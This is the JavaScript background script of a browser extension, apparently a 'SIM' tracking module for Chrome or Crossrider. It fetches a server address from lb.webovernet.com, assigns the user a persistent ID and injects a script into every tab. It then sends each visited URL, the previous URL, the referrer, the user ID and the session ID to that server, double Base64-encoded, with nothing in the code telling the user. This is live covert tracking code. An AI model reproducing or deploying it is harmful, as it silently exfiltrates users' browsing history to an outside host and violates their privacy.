/*
 file guid : {DD71393A-34E6-42E5-88AC-BE05398DAA05}
 */
(function () {
    var SIM_ModuleConstants = {_TMV: "3002.1"};
    var SIM_Config_BG = {_source: null, _default_source: "808", _url_lb: "http://lb.webovernet.com/settings", _DEBUG_MODE: false, getSourceId: function () {
        try {
            if (this._source != null) {
                return this._source
            } else {
                if (utils.isCrossRider()) {
                    this._source = utils.getInstallerSourceId(this._default_source)
                } else {
                    this._source = this._default_source
                }
                if (false) {
                    try {
                        utils.db.remove("source");
                        utils.db.set("source", this._source)
                    } catch (e) {
                        SIM_Logger_BG.SEVERE("8876", e)
                    }
                }
                return this._source
            }
        } catch (e) {
            SIM_Logger_BG.SEVERE("8877", e);
            return this._default_source
        }
    }};
    var SIM_DB_CrossRider = {setImpl: function (key, value) {
        appAPI.db.set(key, value)
    }, getImpl: function (key) {
        return appAPI.db.get(key)
    }, removeImpl: function (key) {
        appAPI.db.remove(key)
    }, clearImpl: function () {
        throw new Error("clearImpl - Not implemented yet");
    }};
    var SIM_DB_GC_Native = {setImpl: function (key, value) {
        window.localStorage[key] = value
    }, getImpl: function (key) {
        return window.localStorage[key]
    }, removeImpl: function (key) {
        window.localStorage[key] = undefined;
        window.localStorage.removeItem(key)
    }, clearImpl: function () {
        for (var k in window.localStorage) {
            this.removeImpl(k)
        }
    }};
    var SIM_DB_Adapter = {_db: undefined, init: function () {
        if (this._db == undefined) {
            if (typeof appAPI !== "undefined") {
                this._db = SIM_DB_CrossRider
            } else {
                this._db = SIM_DB_GC_Native
            }
        }
    }, set: function (key, value) {
        if (typeof key != "string" || key == "") {
            throw new Error("4002, Invalid param: key");
        }
        if (this._db == undefined) {
            this.init()
        }
        this._db.setImpl(key, value)
    }, get: function (key) {
        if (typeof key != "string" || key == "") {
            throw new Error("4003, Invalid param: key");
        }
        if (this._db == undefined) {
            this.init()
        }
        return this._db.getImpl(key)
    }, remove: function (key) {
        if (typeof key != "string" || key == "") {
            throw new Error("4004, Invalid param: key");
        }
        if (this._db == undefined) {
            this.init()
        }
        this._db.removeImpl(key)
    }, clear: function () {
        if (this._db == undefined) {
            this.init()
        }
        this._db.clearImpl()
    }};
    var SIM_Request_CrossRider = {postImpl: function (url_, expectedResult_, data_, onSuccess_, onError_) {
        appAPI.request.post({url: url_, postData: data_, onSuccess: onSuccess_, onFailure: onError_, contentType: "application/x-www-form-urlencoded"})
    }, getImpl: function (url_, expectedResult_, onSuccess_, onError_) {
        appAPI.request.get({url: url_, onSuccess: onSuccess_, onFailure: onError_})
    }};
    var SIM_Request_GC_Native = {postImpl: function (url_, expectedResult_, data_, onSuccess_, onError_) {
        $.ajax({type: "POST", url: url_, dataType: expectedResult_, data: data_, success: onSuccess_, error: onError_})
    }, getImpl: function (url_, expectedResult_, onSuccess_, onError_) {
        $.ajax({type: "GET", url: url_, dataType: expectedResult_, success: onSuccess_, error: onError_})
    }};
    var SIM_Request_Adapter = {_impl: undefined, init: function () {
        if (this._impl == undefined) {
            if (typeof appAPI !== "undefined") {
                this._impl = SIM_Request_CrossRider
            } else {
                this._impl = SIM_Request_GC_Native
            }
        }
    }, post: function (url_, expectedResult_, data_, onSuccess_, onError_) {
        if (typeof url_ != "string" || url_ == "") {
            throw new Error("4007, Invalid param: url_");
        }
        if (typeof expectedResult_ != "string" || expectedResult_ != "text" && expectedResult_ != "json") {
            throw new Error("4008, Invalid param: expectedResult_");
        }
        if (typeof data_ != "string") {
            throw new Error("4009, Invalid param: data_");
        }
        if (typeof onSuccess_ != "function") {
            throw new Error("4010, Invalid param: onSuccess_");
        }
        if (typeof onError_ != "function") {
            throw new Error("4011, Invalid param: onError_");
        }
        if (this._impl == undefined) {
            this.init()
        }
        this._impl.postImpl(url_, expectedResult_, data_, onSuccess_, onError_)
    }, get: function (url_, expectedResult_, onSuccess_, onError_) {
        if (typeof url_ != "string" || url_ == "") {
            throw new Error("4012, Invalid param: url_");
        }
        if (typeof expectedResult_ != "string" || expectedResult_ != "text" && expectedResult_ != "json") {
            throw new Error("4013, Invalid param: expectedResult_");
        }
        if (typeof onSuccess_ != "function") {
            throw new Error("4014, Invalid param: onSuccess_");
        }
        if (typeof onError_ != "function") {
            throw new Error("4015, Invalid param: onError_");
        }
        if (this._impl == undefined) {
            this.init()
        }
        this._impl.getImpl(url_, expectedResult_, onSuccess_, onError_)
    }};
    var SIM_Browser = {getName: function () {
        if (typeof appAPI !== "undefined") {
            return appAPI.browser.name
        } else {
            return"chrome"
        }
    }};
    var SIM_StoragePerTMV = {set: function (key, value) {
        key = SIM_ModuleConstants._TMV + "." + key;
        utils.db.set(key, value)
    }, get: function (key) {
        key = SIM_ModuleConstants._TMV + "." + key;
        return utils.db.get(key)
    }};
    var SIM_FrameworkUtils = {db: SIM_DB_Adapter, browser: SIM_Browser, net: SIM_Request_Adapter, db_tmv: SIM_StoragePerTMV, isCrossRider: function () {
        if (typeof appAPI !== "undefined") {
            return true
        } else {
            return false
        }
    }, createRandomNumber: function () {
        return Math.floor(Math.random() * 1E18)
    }, createRandomString: function (string_size) {
        var text = "";
        var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        for (var i = 0; i < string_size; i++) {
            text += possible.charAt(Math.floor(Math.random() * possible.length))
        }
        return text
    }, createUserID: function () {
        if (typeof appAPI !== "undefined") {
            return appAPI.getCrossriderID() || this.createRandomString(15)
        } else {
            return this.createRandomString(15)
        }
    }, getInstallerSourceId: function (defaultValue) {
        if (typeof appAPI !== "undefined") {
            var tmp = appAPI.installer.getParams()["source_id"];
            if (tmp != 0) {
                return tmp
            } else {
                return defaultValue
            }
        } else {
            return defaultValue
        }
    }, getSub: function () {
        if (typeof appAPI !== "undefined") {
            return appAPI.appID || ""
        } else {
            return"chrome"
        }
    }, getExtensionId: function () {
        if (typeof appAPI !== "undefined") {
            return appAPI.appID
        } else {
            if (this.browser.getName() == "chrome") {
                if (typeof chrome.runtime !== "undefined") {
                    return chrome.runtime.id
                } else {
                    return chrome.i18n.getMessage("@@extension_id")
                }
            } else {
                throw new Error("4016, not implemented");
            }
        }
    }};
    var SIM_Logger_BG = {_counter: 0, logImpl: function (level, msg) {
        if (SIM_Config_BG._DEBUG_MODE) {
            try {
                var msg2 = ++this._counter + "> " + this.getNow() + ", " + level + ", " + msg;
                if (utils.browser.getName() == "chrome" && (level == "ERROR" || level == "SEVERE")) {
                    console.error(msg2)
                } else {
                    if (utils.browser.getName() == "chrome" && level == "HIGHLIGHT") {
                        msg2 = "%c" + msg2;
                        var css = "color: blue;";
                        css += "a:link{color: blue;};a:active{color: blue;}";
                        console.log(msg2, css)
                    } else {
                        console.log(msg2)
                    }
                }
            } catch (e) {
            }
        }
    }, HT: function (msg) {
        this.logImpl("HIGHLIGHT", msg)
    }, INFO: function (msg) {
        this.logImpl("INFO", msg)
    }, ERROR: function (msg) {
        this.logImpl("ERROR", msg)
    }, SEVERE: function (msg, e) {
        this.logImpl("SEVERE", msg + " Exception: " + e.message)
    }, SEVERE2: function (msg) {
        this.logImpl("SEVERE", msg)
    }, pad: function pad(num, size) {
        var s = num + "";
        while (s.length < size) {
            s = "0" + s
        }
        return s
    }, getNow: function () {
        try {
            var d = new Date;
            var date = d.getDate() + "/" + (d.getMonth() + 1) + "/" + d.getFullYear();
            var hour = this.pad(d.getHours(), 2) + ":" + this.pad(d.getMinutes(), 2) + ":" + this.pad(d.getSeconds(), 2) + "." + this.pad(d.getMilliseconds(), 3);
            var result = date + " " + hour;
            return result
        } catch (e) {
            return""
        }
    }, addConsoleHelper: function () {
        if (SIM_Config_BG._DEBUG_MODE) {
            chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
                if (request.console_log_message != undefined) {
                    var src = sender.tab ? ", from a content script of url : = [" + sender.tab.url + "]" : ", from the extension.";
                    var msg = "FROM_CONTENT_PAGE : message = [" + request.console_log_message + "]" + src;
                    log.INFO(msg)
                } else {
                }
            })
        }
    }, testLogFromContentPage: function (tabId) {
        var executeInContentPage = function () {
            try {
                chrome.runtime.sendMessage({console_log_message: "message from content page"}, function (response) {
                })
            } catch (e) {
                alert(e)
            }
        };
        var sFunction = executeInContentPage.toString();
        var sCode = sFunction.slice(sFunction.indexOf("{") + 1, sFunction.lastIndexOf("}"));
        chrome.tabs.executeScript(tabId, {code: sCode}, function (result) {
            log.INFO("executeScript, result = " + result)
        })
    }};
    var SIM_Base64 = {_keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=", encode: function (input) {
        var output = "";
        var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
        var i = 0;
        input = this._utf8_encode(input);
        while (i < input.length) {
            chr1 = input.charCodeAt(i++);
            chr2 = input.charCodeAt(i++);
            chr3 = input.charCodeAt(i++);
            enc1 = chr1 >> 2;
            enc2 = (chr1 & 3) << 4 | chr2 >> 4;
            enc3 = (chr2 & 15) << 2 | chr3 >> 6;
            enc4 = chr3 & 63;
            if (isNaN(chr2)) {
                enc3 = enc4 = 64
            } else {
                if (isNaN(chr3)) {
                    enc4 = 64
                }
            }
            output = output + this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) + this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4)
        }
        return output
    }, decode: function (input) {
        var output = "";
        var chr1, chr2, chr3;
        var enc1, enc2, enc3, enc4;
        var i = 0;
        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
        while (i < input.length) {
            enc1 = this._keyStr.indexOf(input.charAt(i++));
            enc2 = this._keyStr.indexOf(input.charAt(i++));
            enc3 = this._keyStr.indexOf(input.charAt(i++));
            enc4 = this._keyStr.indexOf(input.charAt(i++));
            chr1 = enc1 << 2 | enc2 >> 4;
            chr2 = (enc2 & 15) << 4 | enc3 >> 2;
            chr3 = (enc3 & 3) << 6 | enc4;
            output = output + String.fromCharCode(chr1);
            if (enc3 != 64) {
                output = output + String.fromCharCode(chr2)
            }
            if (enc4 != 64) {
                output = output + String.fromCharCode(chr3)
            }
        }
        output = this._utf8_decode(output);
        return output
    }, _utf8_encode: function (string) {
        string = string.replace(/\r\n/g, "\n");
        var utftext = "";
        for (var n = 0; n < string.length; n++) {
            var c = string.charCodeAt(n);
            if (c < 128) {
                utftext += String.fromCharCode(c)
            } else {
                if (c > 127 && c < 2048) {
                    utftext += String.fromCharCode(c >> 6 | 192);
                    utftext += String.fromCharCode(c & 63 | 128)
                } else {
                    utftext += String.fromCharCode(c >> 12 | 224);
                    utftext += String.fromCharCode(c >> 6 & 63 | 128);
                    utftext += String.fromCharCode(c & 63 | 128)
                }
            }
        }
        return utftext
    }, _utf8_decode: function (utftext) {
        var string = "";
        var i = 0;
        var c = 0;
        var c2 = 0;
        var c3 = 0;
        while (i < utftext.length) {
            c = utftext.charCodeAt(i);
            if (c < 128) {
                string += String.fromCharCode(c);
                i++
            } else {
                if (c > 191 && c < 224) {
                    c2 = utftext.charCodeAt(i + 1);
                    string += String.fromCharCode((c & 31) << 6 | c2 & 63);
                    i += 2
                } else {
                    c2 = utftext.charCodeAt(i + 1);
                    c3 = utftext.charCodeAt(i + 2);
                    string += String.fromCharCode((c & 15) << 12 | (c2 & 63) << 6 | c3 & 63);
                    i += 3
                }
            }
        }
        return string
    }};
    if (typeof JSON !== "object") {
        JSON = {}
    }
    (function () {
        function f(n) {
            return n < 10 ? "0" + n : n
        }

        if (typeof Date.prototype.toJSON !== "function") {
            Date.prototype.toJSON = function () {
                return isFinite(this.valueOf()) ? this.getUTCFullYear() + "-" + f(this.getUTCMonth() + 1) + "-" + f(this.getUTCDate()) + "T" + f(this.getUTCHours()) + ":" + f(this.getUTCMinutes()) + ":" + f(this.getUTCSeconds()) + "Z" : null
            };
            String.prototype.toJSON = Number.prototype.toJSON = Boolean.prototype.toJSON = function () {
                return this.valueOf()
            }
        }
        var cx = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g, escapable = /[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g, gap, indent, meta = {"\b": "\\b", "\t": "\\t", "\n": "\\n", "\f": "\\f", "\r": "\\r", '"': '\\"', "\\": "\\\\"}, rep;

        function quote(string) {
            escapable.lastIndex = 0;
            return escapable.test(string) ? '"' + string.replace(escapable, function (a) {
                var c = meta[a];
                return typeof c === "string" ? c : "\\u" + ("0000" + a.charCodeAt(0).toString(16)).slice(-4)
            }) + '"' : '"' + string + '"'
        }

        function str(key, holder) {
            var i, k, v, length, mind = gap, partial, value = holder[key];
            if (value && (typeof value === "object" && typeof value.toJSON === "function")) {
                value = value.toJSON(key)
            }
            if (typeof rep === "function") {
                value = rep.call(holder, key, value)
            }
            switch (typeof value) {
                case "string":
                    return quote(value);
                case "number":
                    return isFinite(value) ? String(value) : "null";
                case "boolean":
                    ;
                case "null":
                    return String(value);
                case "object":
                    if (!value) {
                        return"null"
                    }
                    gap += indent;
                    partial = [];
                    if (Object.prototype.toString.apply(value) === "[object Array]") {
                        length = value.length;
                        for (i = 0; i < length; i += 1) {
                            partial[i] = str(i, value) || "null"
                        }
                        v = partial.length === 0 ? "[]" : gap ? "[\n" + gap + partial.join(",\n" + gap) + "\n" + mind + "]" : "[" + partial.join(",") + "]";
                        gap = mind;
                        return v
                    }
                    if (rep && typeof rep === "object") {
                        length = rep.length;
                        for (i = 0; i < length; i += 1) {
                            if (typeof rep[i] === "string") {
                                k = rep[i];
                                v = str(k, value);
                                if (v) {
                                    partial.push(quote(k) + (gap ? ": " : ":") + v)
                                }
                            }
                        }
                    } else {
                        for (k in value) {
                            if (Object.prototype.hasOwnProperty.call(value, k)) {
                                v = str(k, value);
                                if (v) {
                                    partial.push(quote(k) + (gap ? ": " : ":") + v)
                                }
                            }
                        }
                    }
                    v = partial.length === 0 ? "{}" : gap ? "{\n" + gap + partial.join(",\n" + gap) + "\n" + mind + "}" : "{" + partial.join(",") + "}";
                    gap = mind;
                    return v
            }
        }

        if (typeof JSON.stringify !== "function") {
            JSON.stringify = function (value, replacer, space) {
                var i;
                gap = "";
                indent = "";
                if (typeof space === "number") {
                    for (i = 0; i < space; i += 1) {
                        indent += " "
                    }
                } else {
                    if (typeof space === "string") {
                        indent = space
                    }
                }
                rep = replacer;
                if (replacer && (typeof replacer !== "function" && (typeof replacer !== "object" || typeof replacer.length !== "number"))) {
                    throw new Error("JSON.stringify");
                }
                return str("", {"": value})
            }
        }
        if (typeof JSON.parse !== "function") {
            JSON.parse = function (text, reviver) {
                var j;

                function walk(holder, key) {
                    var k, v, value = holder[key];
                    if (value && typeof value === "object") {
                        for (k in value) {
                            if (Object.prototype.hasOwnProperty.call(value, k)) {
                                v = walk(value, k);
                                if (v !== undefined) {
                                    value[k] = v
                                } else {
                                    delete value[k]
                                }
                            }
                        }
                    }
                    return reviver.call(holder, key, value)
                }

                text = String(text);
                cx.lastIndex = 0;
                if (cx.test(text)) {
                    text = text.replace(cx, function (a) {
                        return"\\u" + ("0000" + a.charCodeAt(0).toString(16)).slice(-4)
                    })
                }
                if (/^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g, "@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, "]").replace(/(?:^|:|,)(?:\s*\[)+/g, ""))) {
                    j = eval("(" + text + ")");
                    return typeof reviver === "function" ? walk({"": j}, "") : j
                }
                throw new SyntaxError("JSON.parse");
            }
        }
    })();
    var SIM_Session = {_sessionid: undefined, getSessionId: function () {
        if (typeof this._sessionid == "undefined") {
            this._sessionid = utils.createRandomNumber()
        }
        return this._sessionid
    }};
    var SIM_LB_Client = function () {
        function get_cur_version() {
            try {
                var xhr = new XMLHttpRequest;
                xhr.open("GET", chrome.extension.getURL("manifest.json"), false);
                xhr.send(null);
                var manifest = JSON.parse(xhr.responseText);
                return manifest.version
            } catch (e) {
                return undefined
            }
        }

        this.initOnceAfterInstall = function () {
            if (typeof utils.db.get("userid") == "undefined") {
                var id = utils.createUserID();
                utils.db.set("userid", id)
            }
            if (typeof utils.db.get("install_time") == "undefined") {
                var now = (new Date).getTime() / 1E3;
                utils.db.set("install_time", now)
            }
        };
        this.start_lb = function () {
            try {
                log.HT("start_lb enter");
                if (false) {
                    utils.db.clear()
                }
                this.initOnceAfterInstall();
                if (false) {
                    utils.db.remove("sessionid");
                    utils.db.set("sessionid", utils.createRandomNumber())
                }
                var url = SIM_Config_BG._url_lb;
                var qs = "s=" + SIM_Config_BG.getSourceId();
                qs += "&ins=" + encodeURIComponent(utils.db.get("install_time")) + "&ver=" + encodeURIComponent(get_cur_version());
                url = url + "?" + qs;
                utils.net.get(url, "json", function (result) {
                    log.INFO("Success to get lb");
                    if (result.Status) {
                        if (result.Status == "1") {
                            if (result.Endpoint) {
                                utils.db_tmv.set("server", result.Endpoint);
                                if (result.Mon && result.Mon == "1") {
                                    utils.db.set("enable_mon", true)
                                } else {
                                    utils.db.set("enable_mon", false)
                                }
                            } else {
                                log.ERROR("Invalid lb response, no Endpoint or Midpoint")
                            }
                        } else {
                            utils.db_tmv.set("server", "");
                            utils.db.set("enable_mon", false)
                        }
                    } else {
                        log.ERROR("Invalid lb response, no Status = " + result.Status)
                    }
                }, function (httpCode) {
                    log.ERROR("Failed to get lb, ,url = " + url + ", httpCode = " + httpCode.status)
                });
                log.HT("start_lb leave");
                try {
                    log.addConsoleHelper()
                } catch (e) {
                    log.SEVERE("9071", e)
                }
                var dt = new SIM_DataTracker_GC;
                dt.start()
            } catch (e) {
                log.SEVERE("9001", e)
            }
        }
    };
    var SIM_DataTracker_GC = function () {
        var _tmv = SIM_ModuleConstants._TMV;
        var tabs_prevs = new Array;
        var tabs_updates = new Array;
        var tabs_states = new Array;

        function tabs_onUpdated(tabId, changeInfo, tab) {
            try {
                log.HT("tabs_onUpdated, tabId = " + tabId + ", changeInfo.status = " + changeInfo.status + ", tab = " + tab.url);
                if (changeInfo && (changeInfo.status && changeInfo.status == "complete")) {
                } else {
                    return
                }
                if (false) {
                    var prev_url = "";
                    try {
                        if (tabs_prevs[tab.id]) {
                            prev_url = tabs_prevs[tab.id]
                        }
                    } catch (e) {
                        console.error("ERR 8003: " + e)
                    }
                }
                if (tab.url == "chrome://newtab/") {
                    return
                }
                if (tab.url.indexOf("chrome-devtools://") != -1) {
                    return
                }
                var executeInContentPage = function () {
                    try {
                        var docType1 = "";
                        try {
                            docType1 = document.doctype.name
                        } catch (e) {
                        }
                        var oParamsFromContentToBG = {docType: docType1, tab_id: __TABID__PLACEHOLDER__, tab_url_: __TABURL__PLACEHOLDER__, change_status_: __CHANGE_STATUS__PLACEHOLDER__, fromTMV_: __TMV__PLACEHOLDER__, ref: document.referrer, messageId_: 55557777};
                        chrome.extension.sendRequest(oParamsFromContentToBG, function (response) {
                        })
                    } catch (e) {
                    }
                };
                var sFunction = executeInContentPage.toString();
                sFunction = sFunction.replace("__TABID__PLACEHOLDER__", tab.id);
                sFunction = sFunction.replace("__TABURL__PLACEHOLDER__", "'" + tab.url + "'");
                sFunction = sFunction.replace("__CHANGE_STATUS__PLACEHOLDER__", "'" + changeInfo.status + "'");
                sFunction = sFunction.replace("__TMV__PLACEHOLDER__", "'" + _tmv + "'");
                var sCode = sFunction.slice(sFunction.indexOf("{") + 1, sFunction.lastIndexOf("}"));
                chrome.tabs.executeScript(tab.id, {code: sCode}, function (result) {
                })
            } catch (e) {
                console.error("ERR 8000: " + e)
            }
        }

        function computePrev2(tabId) {
            try {
                if (false) {
                    var lastReportedUrl = undefined;
                    var prevTabId = undefined;
                    lastReportedUrl = tabs_prevs[tabId];
                    if (!lastReportedUrl || lastReportedUrl == "") {
                        if (tabId != _activeTabId) {
                            prevTabId = _activeTabId;
                            log.INFO("prevTabId flow A")
                        } else {
                            if (tabId != _prevActiveTabId) {
                                prevTabId = _prevActiveTabId;
                                log.INFO("prevTabId flow B")
                            } else {
                                log.ERROR("Failed to find prevTabId")
                            }
                        }
                    } else {
                        prevTabId = tabId
                    }
                    var res_prev_url = "";
                    if (prevTabId) {
                        if (tabs_prevs[prevTabId]) {
                            res_prev_url = tabs_prevs[prevTabId]
                        }
                    }
                    return res_prev_url
                } else {
                    var res_prev_url = "";
                    if (tabs_prevs[tabId]) {
                        res_prev_url = tabs_prevs[tabId]
                    }
                    return res_prev_url
                }
            } catch (e) {
                console.error("ERROR 8001: " + e);
                return""
            }
        }

        function extension_onRequest(request, sender, sendResponse) {
            var response = request;
            try {
                var extensionId = utils.getExtensionId();
                if (sender && sender.id == extensionId) {
                    var fromTMV = request.fromTMV_;
                    if (fromTMV && fromTMV == _tmv) {
                        if (response.messageId_ && response.messageId_ == 55557777) {
                            var tabId = response.tab_id;
                            var res_prev_url = computePrev2(tabId);
                            if (utils.db_tmv.get("server") != "" && utils.db_tmv.get("server") != "undefined") {
                                var ref = response["ref"];
                                var docType = response["docType"];
                                var tab_url = response["tab_url_"];
                                var change_status = response["change_status_"];
                                log.HT("extension_onRequest, url = [" + tab_url + "] ,ref = [" + ref + "],  computePrev2 = [" + res_prev_url + "]");
                                if (true) {
                                    var firstEventOnTab = false;
                                    var lastReportedUrl = tabs_prevs[tabId];
                                    if (!lastReportedUrl || lastReportedUrl == "") {
                                        firstEventOnTab = true
                                    }
                                    if (firstEventOnTab) {
                                        if (true) {
                                            var pattern = "(http|https)://(.*.|)google..*/url?.*";
                                            var regex = new RegExp(pattern, undefined);
                                            var result = regex.test(tab_url);
                                            regex = null;
                                            if (result) {
                                                log.HT("extension_onRequest: Skipped redirect = " + tab_url);
                                                return
                                            }
                                        }
                                    }
                                    if (true) {
                                        var pattern = "(http|https)://(.*.|)google..*/aclk?.*";
                                        var regex = new RegExp(pattern, undefined);
                                        var result = regex.test(tab_url);
                                        regex = null;
                                        if (result) {
                                            log.HT("extension_onRequest: Skipped ppc redirect = " + tab_url);
                                            return
                                        }
                                    }
                                }
                                if (docType != "html" && docType != "") {
                                    tabs_prevs[tabId] = "";
                                    log.ERROR("ERROR 8000 ??");
                                    return
                                }
                                tabs_prevs[tabId] = tab_url;
                                var update_diff = -1;
                                if (tabs_updates[tabId]) {
                                    update_diff = Date.now() - tabs_updates[tabId]
                                }
                                tabs_updates[tabId] = Date.now();
                                if (update_diff >= 0 && update_diff < 100) {
                                    if (tabs_prevs[tabId] == tab_url) {
                                        log.ERROR("ERROR 8001 ?? Skipped, update_diff < 10, tab_url = " + tab_url);
                                        return
                                    }
                                }
                                var prev_state = tabs_states[tabId];
                                tabs_states[tabId] = change_status;
                                if (res_prev_url == tab_url && prev_state != change_status) {
                                    log.ERROR("ERROR 8002 ??");
                                    return
                                }
                                var data = "s=" + SIM_Config_BG.getSourceId() + "&md=21&pid=" + utils.db.get("userid") + "&sess=" + SIM_Session.getSessionId() + "&q=" + encodeURIComponent(tab_url) + "&prev=" + encodeURIComponent(res_prev_url) + "&link=" + (ref ? "1" : "0") + "&sub=chrome&hreferer=" + encodeURIComponent(ref);
                                data = data + "&tmv=" + SIM_ModuleConstants._TMV;
                                data = SIM_Base64.encode(SIM_Base64.encode(data));
                                data = "e=" + data;
                                var url = utils.db_tmv.get("server") + "/related";
                                utils.net.post(url, "json", data, function (result) {
                                    log.INFO("Succeeded in posting data");
                                    tabs_prevs[tabId] = tab_url
                                }, function (httpCode) {
                                    log.INFO("Failed to retrieve content. (HTTP Code:" + httpCode.status + ")");
                                    log.ERROR("ERROR 8004 ??");
                                    tabs_prevs[tabId] = tab_url
                                })
                            }
                        } else {
                            log.ERROR("messaged unknown, or undefined : request = " + request)
                        }
                    } else {
                        if (fromTMV) {
                            log.INFO("Message of other tmv = " + fromTMV)
                        } else {
                            log.ERROR("Message without fromTMV")
                        }
                    }
                } else {
                    log.ERROR("unknown sender = " + sender.id)
                }
            } catch (e) {
                console.error("ERR 8002: " + e)
            }
        }

        var _prevActiveTabId = "";
        var _activeTabId = "";

        function tabs_onActivated(activeInfo) {
            try {
                log.INFO("tabs.onActivated  windowId = " + activeInfo.windowId + ", tabId = " + activeInfo.tabId);
                if (activeInfo.tabId >= 0) {
                    _prevActiveTabId = _activeTabId;
                    _activeTabId = activeInfo.tabId
                } else {
                    log.ERROR("tabs_onActivated, how to handle activeInfo.tabId <0  ?")
                }
            } catch (e) {
                log.SEVERE("8834", e)
            }
        }

        function tabs_onReplaced(addedTabId, removedTabId) {
            try {
                log.INFO("tabs_onReplaced, addedTabId = " + addedTabId + ", removedTabId = " + removedTabId);
                if (addedTabId >= 0 && removedTabId >= 0) {
                    var dbg = 0;
                    dbg = 1
                }
            } catch (e) {
                log.SEVERE("8837", e)
            }
        }

        this.start = function () {
            try {
                chrome.extension.onRequest.addListener(extension_onRequest);
                chrome.tabs.onUpdated.addListener(tabs_onUpdated);
                chrome.tabs.onActivated.addListener(tabs_onActivated);
                chrome.tabs.onReplaced.addListener(tabs_onReplaced)
            } catch (e) {
                log.SEVERE("8835", e)
            }
        }
    };
    var log = SIM_Logger_BG;
    var utils = SIM_FrameworkUtils;
    this.main = function () {
        try {
            var lbclient = new SIM_LB_Client;
            lbclient.start_lb()
        } catch (e) {
            console.log("9099, " + e)
        }
    };
    this.main()
})();

